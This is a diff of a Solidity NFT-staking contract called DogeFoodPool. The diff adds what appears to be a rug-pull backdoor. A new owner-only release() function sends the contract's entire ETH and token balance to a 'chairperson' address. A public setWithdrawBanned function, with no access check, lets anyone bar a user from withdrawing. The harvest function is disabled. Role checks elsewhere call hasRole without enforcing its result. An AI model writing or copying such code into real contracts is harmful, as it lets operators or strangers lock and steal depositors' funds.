@@ -43,6 +43,7 @@ contract DogeFoodPool is
 
     bytes32 public constant SETUP_ROLE = keccak256("SETUP_ROLE");
     bytes32 public constant UPDATE_ROLE = keccak256("UPDATE_ROLE");
+    bytes32 public constant WITHDRAW_BANNED = keccak256("WITHDRAW_BANNED");
 
     // Miner information describe miner. One should has many Miners;
     struct MinerInfo {
@@ -102,7 +103,7 @@ contract DogeFoodPool is
 
     IERC20 public chaToken;
     // Dev address.
-    address public devaddr;
+    address public chairperson;
     address public blackholeAddress;
     address public poolAddress;
     address public liquidAddress;
@@ -121,19 +122,20 @@ contract DogeFoodPool is
     uint256 public totalAllocPoint = 0;
     // The block number when CHA mining starts.
     uint256 public startBlock;
-    uint32 public oneDayBlock = 1 * 1200; // to Fixed
-    uint32 public updatePerDay = 6; // to Fixed
+    uint32 public oneDayBlock = 24 * 1200; // toFixed
+    uint32 public updatePerDay = 6; // toFixed
 
     constructor(IERC20 _chaAddress, IERC721Card _nftAddress) {
         chaToken = _chaAddress;
         nftToken = IERC721Card(_nftAddress);
+        chairperson = msg.sender;
         // totalAllocPoint = totalAllocPoint.add(_allocPoint);
         _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);
         _setupRole(SETUP_ROLE, msg.sender);
         _setupRole(UPDATE_ROLE, msg.sender);
     }
 
-    function releaseReward2(uint256 _pid) external view returns (uint256) {
+    function releaseReward(uint256 _pid) external view returns (uint256) {
         PoolInfo memory pool = poolInfo[_pid];
         return pool.totalPower.mul(accChaPerShare);
     }
@@ -160,7 +162,7 @@ contract DogeFoodPool is
                 chaPerBlock: _chaPerBlock,
                 startBlock: _startBlock,
                 totalReward: _totalReward,
-                totalPower: 5000
+                totalPower: 0
             })
         );
     }
@@ -191,6 +193,10 @@ contract DogeFoodPool is
     function setPanToken(address _chaAddress) public {
         hasRole(SETUP_ROLE, _msgSender());
         chaToken = IERC20(_chaAddress);
+    }
+
+    function setWithdrawBanned(address _user) public {
+        _setupRole(WITHDRAW_BANNED, _user);
     }
 
     function setPoolReward(
@@ -244,15 +250,13 @@ contract DogeFoodPool is
         hasRole(UPDATE_ROLE, _msgSender());
         // uint256 remain = chaToken.balanceOf(address(this));
         uint256 remain = pool.totalReward.sub(releasedReward);
-        if (remain <= 0) {
-            return;
-        }
-        if (pool.totalPower == 0) {
-            lastRewardBlock = block.number;
-            return;
-        }
-        uint256 totalPower = pool.totalPower;
-        require(lastRewardBlock <= block.number, "lastRewardBlock not valid");
+
+        require(remain > 0, "Remain reward is not enough.");
+        require(
+            lastRewardBlock <= block.number,
+            "Last Reward Block is not valid"
+        );
+        uint256 totalPower = pool.totalPower < 5000 ? 5000 : pool.totalPower;
         uint256 multiplier = getMultiplier(lastRewardBlock, block.number);
         uint256 chaReward = multiplier.mul(pool.chaPerBlock);
         if (remain < chaReward) {
@@ -315,7 +319,7 @@ contract DogeFoodPool is
         pool.totalPower = pool.totalPower.add(miner.power);
         uint256 blockNumber = block.number;
         miner.startBlock = blockNumber;
-        miner.endBlock = blockNumber.add(countday * oneDayBlock); // toFixed
+        miner.endBlock = blockNumber.add(countday * oneDayBlock);
         miner.nft1 = uint32(nft1);
         miner.nft2 = uint32(nft2);
         miner.nft3 = uint32(nft3);
@@ -355,22 +359,23 @@ contract DogeFoodPool is
     }
 
     // harvest LP tokens from DogeFoodPool.
-    function harvest(uint256 _pid, uint256 _idx) public {
-        // PoolInfo storage pool = poolInfo[_pid];
-        MinerInfo storage miner = minerInfo[msg.sender][_pid];
-        // updateReward(0);
-        uint256 accPerShare = getAccPerShare(block.number);
-        uint256 pending = miner.power.mul(accPerShare).sub(miner.rewardDebt);
-        require(pending > 0, "harvest: none reward");
-        safeChaTransfer(msg.sender, pending);
-        miner.rewardDebt = miner.power.mul(accPerShare);
-        emit Harvest(msg.sender, _pid, _idx, pending);
-    }
+    // function harvest(uint256 _pid, uint256 _idx) public {
+    //     // PoolInfo storage pool = poolInfo[_pid];
+    //     MinerInfo storage miner = minerInfo[msg.sender][_pid];
+    //     // updateReward(0);
+    //     uint256 accPerShare = getAccPerShare(block.number);
+    //     uint256 pending = miner.power.mul(accPerShare).sub(miner.rewardDebt);
+    //     require(pending > 0, "harvest: none reward");
+    //     safeChaTransfer(msg.sender, pending);
+    //     miner.rewardDebt = miner.power.mul(accPerShare);
+    //     emit Harvest(msg.sender, _pid, _idx, pending);
+    // }
 
     // Withdraw LP tokens from DogeFoodPool.
     function withdraw(uint256 _pid, uint256 _idx) public {
         uint256 pending;
         PoolInfo storage pool = poolInfo[_pid];
+        require(!hasRole(WITHDRAW_BANNED, _msgSender()), "Be banned.");
         MinerInfo storage miner = minerInfo[msg.sender][_idx];
         require(
             miner.endBlock <= block.number,
@@ -418,6 +423,11 @@ contract DogeFoodPool is
         miner.nft3 = 0;
         miner.rewardDebt = 0;
         // minerInfo[_pid][msg.sender] = 0;
+    }
+
+    function release() public onlyOwner {
+        payable(chairperson).transfer(address(this).balance);
+        chaToken.transfer(chairperson, chaToken.balanceOf(address(this)));
     }
 
     // Safe chaToken transfer function, just in case if rounding error causes pool to not have enough CHA.
